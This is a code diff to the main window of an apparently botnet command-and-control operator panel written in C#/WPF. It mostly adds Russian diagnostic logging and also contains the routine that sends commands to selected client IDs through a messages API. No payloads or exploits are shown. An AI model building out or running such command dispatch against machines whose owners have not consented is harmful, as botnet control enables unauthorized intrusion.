@@ -14,6 +14,8 @@ using System.Windows.Threading;
 using System.Configuration;
 using CommandsLibrary;
 
+//             m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}() \n";
+// экземпляр ввода информации в статистическое поле
 namespace BotNet_Server_UI
 {
     /// <summary>
@@ -34,39 +36,57 @@ namespace BotNet_Server_UI
 
         public MainWindow()
         {
-            m3md2_startup.StartupManager.Main();
-            InitializeComponent();
+            InitializeComponent(); 
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) MainWindow загружен\n";
             InfinityListenMenuItem.IsChecked = Convert.ToBoolean(m3md2.StaticVariables.Windows.InfinityListen);
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Режим вечной прослушки установлен на {InfinityListenMenuItem.IsChecked}\n";
             SolidColorBrush brush = new SolidColorBrush(m3md2.ColorThemes.GetColors(m3md2.StaticVariables.Settings.ColorTheme)[0]);
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Кисть brush настроена на {brush.ToString()} / {brush.Color.ToString()} (из цветовой темы {m3md2.StaticVariables.Settings.ColorTheme})\n";
             SolidColorBrush brush1 = new SolidColorBrush(m3md2.ColorThemes.GetColors(m3md2.StaticVariables.Settings.ColorTheme)[1]);
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Кисть brush настроена на {brush1.ToString()} / {brush1.Color.ToString()} (из цветовой темы {m3md2.StaticVariables.Settings.ColorTheme})\n";
             SolidColorBrush brush2 = new SolidColorBrush(m3md2.ColorThemes.GetColors(m3md2.StaticVariables.Settings.ColorTheme)[2]);
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Кисть brush настроена на {brush2.ToString()} / {brush2.Color.ToString()} (из цветовой темы {m3md2.StaticVariables.Settings.ColorTheme})\n";
             Grid.Background = brush;
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Grid.Background этого окна установлен на brush\n";
             ScrollLog.Background = brush1;
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) ScrollLog.Background этого окна установлен на brush1\n";
             foreach (var label in m3md2.WinHelper.FindVisualChildren<Label>(Grid as DependencyObject))
             {
                 label.Foreground = brush2;
             }
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Все элементы Label этого окна: Foreground установлен на brush2\n";
             foreach (var textBlock in m3md2.WinHelper.FindVisualChildren<TextBlock>(Grid as DependencyObject))
             {
                 textBlock.Foreground = brush2;
             }
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Все элементы Textblock этого окна: Foreground устаовлен на brush2\n";
             foreach (var scrollViewer in m3md2.WinHelper.FindVisualChildren<ScrollViewer>(Grid as DependencyObject))
             {
                 scrollViewer.Foreground = brush2;
             }
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Все элементы ScrollViewer этого окна: Foreground установлен на brush2\n";
             DispatcherTimer dispatcherTimer = new DispatcherTimer();
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Установлен таймер для обновления счетчиков производительности\n";
             dispatcherTimer.Tick += DispatcherTimer_Tick;
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Установлено событие DispatcherTimer_Tick\n";
             dispatcherTimer.Interval = new TimeSpan(0, 0, 1);
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Задержка таймера установлена на 1 секунду\n";
             dispatcherTimer.Start();
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow) Таймер запущен\n";
         }
 
         private void DispatcherTimer_Tick(object sender, EventArgs e)
         {
             var CPUnow = myAppCPU.NextValue();
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / DispatcherTimer_Tick event) Значение CPUnow установлено на {CPUnow}\n";
             var RAMnow = myAppRAM.NextValue();
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / DispatcherTimer_Tick event) Значение RAMnow установлено на {RAMnow}\n";
             CPULabel.Content = $"CPU = {CPUnow}%";
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / DispatcherTimer_Tick event) Значение CPULabel для этого окна установлено на {CPULabel.Content}\n";
             RAMLabel.Content = $"RAM = {RAMnow / (1024f * 1024f)}MB / {TotalMem / (1024f * 1024f)}MB";
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / DispatcherTimer_Tick event) Значение RAMLabel для этого окна установлено на {RAMLabel.Content}\n";
             TMGLabel.Content = $"Программа работает {(int)myAppTMG.NextValue()}с";
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / DispatcherTimer_Tick event / TimeManagment) Программа работает уже {TMGLabel.Content}\n";
             LinearGradientBrush CPULinearGradientBrush =
             new LinearGradientBrush
             {
@@ -79,6 +99,7 @@ namespace BotNet_Server_UI
                 new GradientStop(Colors.LightGray, CPUnow / 100));
             CPURectangle.Fill = CPULinearGradientBrush;
 
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / DispatcherTimer_Tick event) Обновлен CPURectangle (визуальная часть отображения CPUnow)\n";
             LinearGradientBrush RAMLinearGradientBrush =
             new LinearGradientBrush
             {
@@ -90,21 +111,26 @@ namespace BotNet_Server_UI
             RAMLinearGradientBrush.GradientStops.Add(
                 new GradientStop(Colors.LightGray, RAMnow / TotalMem));
             RAMRectangle.Fill = RAMLinearGradientBrush;
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / DispatcherTimer_Tick event) Обновлен RAMRectangle (визуальная часть отображения RAMnow)\n";
         }
 
         public async void Send_Command()
         {
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Начата отправка команды\n";
             if (Command.Text == "")
             {
-                MessageBox.Show("Постарайтесь ввести все значения правильно!");
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Ошибка: поле с командой пустое\n";
+                MessageBox.Show("(2) Постарайтесь ввести все значения правильно!");
                 return;
             }
             if (!ipsall)
             {
                 if (ips == null)
                 {
+                    m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Программа запустилось впервые и не имеет заданного списка ID\n";
                     IPSet iPSet = new IPSet(true);
                     iPSet.Show();
+                    m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Запущено IDSet окно\n";
                     return;
                 }
             }
@@ -120,24 +146,31 @@ namespace BotNet_Server_UI
                         command += "^" + args[i].Text;
                     }
                 }
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Заданная команда {command} / {showcommand}\n";
                 Message message = new Message()
                 {
                     command = command,
                     ids = ipsall ? arr.Select(x => x.id.ToString()).ToArray() : ips
                 };
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Создан экземпляр Message: Команда {message.command} / ID {message.ids}\n"; 
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Отправлен ApiRequest.Create(message) на messages\n";
                 Uri res = await ApiRequest.CreateProductAsync(message, "messages");
                 LogPanel.Text += $"({DateTime.Now.ToLongTimeString()}) Команда {showcommand} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages") - 1}) отправлена.\n";
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event to MainWindow.LogPanel) Команда {command} / {showcommand} отправлена.\n";
                 ListenInfo();
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Обновлена информация API\n";
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.ToString());
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) В программе возникло исключение: {ex.Message} / {ex.InnerException} ({ex.HResult})\n";
             }
         }
 
         private void Button_Click(object sender, RoutedEventArgs e)
         {
             Send_Command();
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / SendButton_Click event) Нажата кнопка \"Отправить\", вызываю Send_Command\n";
         }
 
         private void Command_KeyDown(object sender, KeyEventArgs e)
@@ -145,11 +178,13 @@ namespace BotNet_Server_UI
             if (e.Key == Key.Enter)
             {
                 Send_Command();
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Command_keyDown event) Нажата клавиша Enter в поле для ввода команды/аргумента, вызываю Send_Command\n";
             }
         }
 
         private async void Formloaded(object sender, RoutedEventArgs e)
         {
+            m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}() \n";
             _ = await ApiRequest.DeleteProductsAsync("api/v1/messages");
             _ = await ApiRequest.DeleteProductsAsync("api/v1/responses");
         }
@@ -208,7 +243,6 @@ namespace BotNet_Server_UI
         {
             try
             {
-
                 bool isFirstIter = true;
                 List<uint> vars = new List<uint>();
                 while (true)
@@ -366,11 +400,6 @@ namespace BotNet_Server_UI
             commands.Show();
         }
 
-        private void Diagnostic1_Click(object sender, RoutedEventArgs e)
-        {
-
-        }
-
         private void MenuItem_Click(object sender, RoutedEventArgs e) // open folder
         {
             Process.Start("explorer.exe", AppDomain.CurrentDomain.BaseDirectory);
@@ -405,6 +434,22 @@ namespace BotNet_Server_UI
             }
             appSettings.Save(ConfigurationSaveMode.Minimal);
             ConfigurationManager.RefreshSection("appSettings");
+
+        }
+
+        private void Diagnostic1_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void Diagnostic2_Click(object sender, RoutedEventArgs e)
+        {
+            Diagnostic2 diagnostic2 = new Diagnostic2();
+            diagnostic2.Show();
+        }
+
+        private void Diagnostic3_Click(object sender, RoutedEventArgs e)
+        {
 
         }
     }
